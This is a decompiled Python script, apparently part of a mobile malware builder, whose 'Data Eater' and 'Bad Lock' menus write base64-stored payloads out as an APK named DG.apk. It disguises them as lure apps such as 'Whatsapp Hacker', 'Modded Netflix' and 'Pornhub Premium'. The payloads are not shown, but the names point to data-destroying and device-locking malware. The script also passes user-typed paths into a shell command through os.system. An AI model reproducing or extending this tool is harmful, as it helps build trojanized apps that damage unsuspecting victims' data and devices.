# Source Generated with Decompyle++
# File: deater.pyc (Python 3.8)
from files.startup import *
import base64
import os

def deater():
    menu_prefix = red + '[' + green + '0' + red + ']'
    menu_options = [
        'WpsApp Pro',
        'Pornhub Premium',
        'Whatsapp Hacker',
        'Termux',
        'Modded Netflix',
        'NetHunter',
        'Wifi Kill',
        'Aircrack-ng',
        'CardingApp',
        'Exit'
    ]
    for idx, option in enumerate(menu_options, 1):
        slow('\n\r' + menu_prefix.replace('0', str(idx)) + yellow + ' ' + option, 0.005)
    default_path = '/sdcard'
    print('\n')
    user_choice = input(green + 'Data Eater ' + red + '>' + yellow)
    apk_type = 'null'
    if user_choice == '1':
        apk_type = 'wps'
    elif user_choice == '2':
        apk_type = 'ph'
    elif user_choice == '3':
        apk_type = 'wa'
    elif user_choice == '4':
        apk_type = 'tmx'
    elif user_choice == '5':
        apk_type = 'nf'
    elif user_choice == '6':
        apk_type = 'nh'
    elif user_choice in ['7', '8', '9']:
        soon()
        return
    elif user_choice == '10':
        exit(0)
    output_path = input(green + 'path :' + red)
    decode_base64('de', apk_type, output_path + 'DG.apk')
    slow(green + 'Generated as ' + red + output_path + 'DG.apk', 0.1)

def decode_base64(folder, apk_type, output_file):
    input_file = os.path.join(folder, apk_type)
    try:
        if os.name == 'nt':  # Windows
            with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
                base64.decode(f_in, f_out)
        else:  # Linux/Unix
            os.system(f'base64 -d "{input_file}" > "{output_file}"')
    except Exception as e:
        print(f"Error decoding file: {e}")

def block():
    menu_prefix = red + '[' + green + '0' + red + ']'
    menu_options = [
        'WpsApp Pro',
        'Pornhub Premium',
        'Whatsapp Hacker',
        'Termux',
        'Modded Netflix',
        'NetHunter',
        'Wifi Kill',
        'Aircrack-ng',
        'CardingApp',
        'Exit'
    ]
    for idx, option in enumerate(menu_options, 1):
        slow('\n\r' + menu_prefix.replace('0', str(idx)) + yellow + ' ' + option, 0.005)
    default_path = '/sdcard'
    print('\n')
    user_choice = input(green + 'Bad Lock ' + red + '>' + yellow)
    apk_type = 'null'
    if user_choice == '1':
        apk_type = 'wps'
    elif user_choice == '2':
        apk_type = 'ph'
    elif user_choice == '3':
        apk_type = 'wa'
    elif user_choice == '4':
        apk_type = 'tmx'
    elif user_choice == '5':
        apk_type = 'nf'
    elif user_choice == '6':
        apk_type = 'nh'
    elif user_choice in ['7', '8', '9']:
        soon()
        return
    elif user_choice == '10':
        exit(0)
    output_path = input(green + 'path :' + red)
    decode_base64('bl', apk_type, output_path + 'DG.apk')
    slow(green + 'Generated as ' + red + output_path + 'DG.apk', 0.1)
